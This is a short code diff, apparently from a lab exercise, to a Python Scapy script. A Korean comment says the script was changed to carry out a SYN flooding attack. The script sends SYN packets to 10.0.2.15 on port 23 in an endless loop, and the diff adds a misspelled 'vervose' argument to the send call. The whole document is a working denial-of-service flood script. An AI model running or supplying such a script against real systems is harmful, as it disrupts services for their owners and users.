@@ -8,4 +8,4 @@ from scapy.all import *
 #SYN FLOODING 공격할 수 있는 코드로 변경
 syn = IP (dst = "10.0.2.15") / TCP (sport = RandShort (), dport = 23, flags = "S")
 while True:
-    send (syn)
+    send (syn, vervose = False)
